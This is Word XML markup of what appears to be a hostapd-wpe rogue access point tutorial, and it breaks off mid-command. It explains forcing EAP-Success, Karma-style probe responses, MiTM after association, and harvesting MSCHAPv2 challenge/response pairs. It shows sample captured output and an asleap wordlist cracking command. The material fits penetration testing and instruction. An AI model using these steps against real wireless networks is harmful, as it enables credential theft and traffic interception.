    <w:p w14:paraId="27BC02C3" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72C2A989" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30EEDD8A" w14:textId="77777777"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EAP-Success</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B5B8D8" w14:textId="77777777"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC31FA6" w14:textId="613F867C"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 xml:space="preserve">Certain EAP types do not require the server to authenticate </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>itself</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, just to validate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>the client's submitted credentials. Since we're playing the authentication server, that means we can easily just return an EAP-Success message to the client regardless</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>of what they send us. The client is happy because they've connected, but unfortunately</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">are unaware that they are connected to an unapproved authenticator. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA20ED5" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="076D3E20" w14:textId="1F3AFAC4"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 xml:space="preserve">At this point, the attacker can set up a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dhcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> server and give the client an IP and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">then do whatever they'd like (e.g. redirect </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, launch attacks, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>MiTM</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, etc</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F5052E" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DA62A2D" w14:textId="26A6C4DC"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MSCHAPv2 protects against this by having the server prove knowledge of the password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">most supplicants adhere to this policy, but we return EAP-Success just in case. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AACF54F" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="684BC64B" w14:textId="77777777"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Karma-Style Probes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6744B89E" w14:textId="77777777" w:rsid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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AC4B76" w14:textId="144A0F85"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 xml:space="preserve">This functionality simply waits for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> client to send a directed probe, when it does, it assumes that SSID and responds to the client. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Only applicable to 802.11 clients.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD7CF93" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E430EDA" w14:textId="77777777"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A note on MSCHAPv2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9D6982" w14:textId="77777777"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B46923" w14:textId="0AA8ABC6"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Microsoft offers something called "Computer Based Authentication". When a computer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>joins a domain it is assigned a password. This password is stored on the system</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>and in active directory. We can harvest the MSCHAPv2 response from these systems but</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> going to take a lifetime to crack. Unless you're just trying to solve for the </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F32572E" w14:textId="03D27CE9" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, and not the actual password :)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2947561B" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30BF0DD8" w14:textId="3D0EB00A" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">One other thing to note, if the client returns all zeros, it </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>isnt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> joined to a domain. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A598906" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="559C917F" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Times" w:hAnsi="Times" w:cs="Times"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve">Success and Capture </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7286A7ED" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">While </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd-wpe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is running, keep an eye on the console output for username/challenge/response combinations. Alternatively, you can tail the log file in the same directory. In both cases, the output will resemble the following: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E5136E" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: patchwork challenge: ac:57:6b:4a:27:99:9c:51 response: 2e:01:41:5c:g6:76:0b:dc:25:3a:0e:96:a8:fb:f1:fd:a2:14:8a:02:10:0 2:6c:ff </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19271ED5" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The challenge and response can be fed to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> for speedy, wordlist- based cracking. Additionally, MSCHAPv2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>creds</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> are also output in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NetNTLM</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>format which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> can be used with John the Ripper. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA2E976" w14:textId="5199F076" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -C ac:57:6b:4a:27:99:9c:51 -R 2e:01:41:5c:g6:76:0b:dc:25:3a:0e:96:a8:fb:f1:fd:a2:14:8a:0 2:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>10:02:6c:ff -W /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
